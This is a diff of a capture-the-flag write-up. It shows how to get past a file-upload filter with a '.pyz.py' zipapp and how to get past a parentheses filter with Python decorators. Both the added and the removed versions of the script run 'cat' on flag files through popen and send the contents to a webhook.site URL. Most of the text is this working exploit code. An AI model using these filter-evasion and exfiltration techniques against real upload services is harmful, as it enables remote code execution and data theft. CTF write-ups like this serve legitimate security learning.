@@ -24,6 +24,20 @@ OK, let me review code.
 It have filter, and just upload `.py`
 But we can use `script.pyz.py`, it can bypass its filter. And if your upload's file format is `.pyz`, it will be executed no matter how its file extension
 
+And it filter `(` and `)`, we can use python's decorator to bypass it.
+For example:
+```c
+cmd2 = lambda a: "cat /app/flags/flag*"
+
+@popen
+@cmd2
+class flag:pass
+```
+
+This code is `popen("cat /app/flags/flag*")`
+No curl or wget, so we use `urllib.request`, and send flag on your server.
+
+
 ## script
 run.sh
 ```sh
@@ -33,22 +47,23 @@ mv script.pyz script.pyz.py
 
 script/\_\_main\_\_.py
 ```py
-import urllib.request
-import os
-import json
+from os import popen
+from urllib.request import urlopen
 
-flag = os.popen('cat /app/flags/flag_7fc489cb-4e06-4cc8-9404-f856816c2033.txt').read().strip()
-url = 'https://webhook.site/4942a284-d09e-417c-9039-d335aaf9af4b'
-data = json.dumps({'flag': flag}).encode('utf-8')
-req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}, method='POST')
+url = "https://webhook.site/5399367e-260a-4a67-bfbc-575f6aaeb333/?flag="
 
-try:
-    response = urllib.request.urlopen(req)
-    content = response.read()
-    print(f"success: {content.decode('utf-8')}")
-    
-except urllib.error.URLError as e:
-    print(f"error: {e}")
+cmd2 = lambda a: "cat /app/flags/flag*"
+func2 = lambda f: [x[:-1] for x in f][0]
+
+@func2
+@popen
+@cmd2
+class flag:pass
+
+flagurl = url + flag
+urls = lambda f: flagurl
+
+@urlopen
+@urls
+class requestf:pass
 ```
-
-We use request send flag to your server.
